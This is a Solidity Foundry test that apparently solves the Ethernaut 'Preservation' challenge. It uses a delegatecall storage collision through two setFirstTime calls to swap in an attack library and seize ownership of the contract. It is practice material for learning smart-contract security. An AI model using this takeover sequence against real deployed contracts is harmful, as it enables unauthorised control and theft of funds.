//SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Preservation} from "../src/PreServation.sol";
import {LibraryContract} from "../src/PreServation.sol";
import {AttackLibraryContract} from "../src/AttackLibraryContract.sol";
import {
    DeployNewLibraryContract
} from "../script/DeployNewLibraryContract.s.sol";

contract TestPreServation is Test {
    Preservation preservation;
    LibraryContract lib1;
    LibraryContract lib2;
    AttackLibraryContract attack;
    DeployNewLibraryContract deploy;

    address spider = makeAddr("spider");

    function setUp() public {
        deploy = new DeployNewLibraryContract();
        attack = deploy.run();
        lib1 = new LibraryContract();
        lib2 = new LibraryContract();
        preservation = new Preservation(address(lib1), address(lib2));
    }

    function testAttack() public {
        //Arrange
        vm.startPrank(spider);
        //Act
        uint256 t1 = uint256(uint160(address(attack)));
        preservation.setFirstTime(t1);
        uint256 player = uint256(uint160(address(spider)));
        preservation.setFirstTime(player);
        //Assert
        assertEq(
            preservation.owner(),
            address(spider),
            "The address is not same"
        );
    }
}
